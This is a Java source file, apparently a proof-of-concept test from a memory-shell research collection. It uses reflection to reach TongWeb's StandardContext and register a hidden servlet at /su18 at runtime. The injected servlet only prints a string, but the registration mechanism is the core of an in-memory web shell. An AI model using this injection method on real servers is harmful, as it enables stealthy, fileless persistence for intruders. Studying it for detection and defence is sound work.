package org.su18.memshell.test.tongweb;

import com.tongweb.catalina.Wrapper;
import com.tongweb.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;

/**
 * TongWeb ≈ Tomcat
 * 亲测有效
 * 测试版本 TongWeb 7.0.25
 *
 * @author su18
 */
public class AddTongWebServlet extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		try {

			String servletName = "su18TongWebServlet";

			// 从 request 中获取 servletContext
			ServletContext servletContext = req.getServletContext();

			// 如果已有此 servletName 的 Servlet，则不再重复添加
			if (servletContext.getServletRegistration(servletName) == null) {

				StandardContext o = null;

				// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
				while (o == null) {
					Field f = servletContext.getClass().getDeclaredField("context");
					f.setAccessible(true);
					Object object = f.get(servletContext);

					if (object instanceof ServletContext) {
						servletContext = (ServletContext) object;
					} else if (object instanceof StandardContext) {
						o = (StandardContext) object;
					}
				}

				// 创建自定义 Servlet
				Servlet servlet = new TestServlet();

				// 使用 Wrapper 封装 Servlet
				Wrapper wrapper = o.createWrapper();
				wrapper.setName(servletName);
				wrapper.setLoadOnStartup(1);
				wrapper.setServlet(servlet);
				wrapper.setServletClass(servlet.getClass().getName());

				// 向 children 中添加 wrapper
				o.addChild(wrapper);

				// 添加 servletMappings
				o.addServletMapping("/su18", servletName);

				PrintWriter writer = resp.getWriter();
				writer.println("tongweb servlet added");

			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static class TestServlet implements Servlet {

		@Override
		public void init(ServletConfig servletConfig) throws ServletException {

		}

		@Override
		public ServletConfig getServletConfig() {
			return null;
		}

		@Override
		public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
			servletResponse.getWriter().println("su18");
		}

		@Override
		public String getServletInfo() {
			return null;
		}

		@Override
		public void destroy() {

		}
	}
}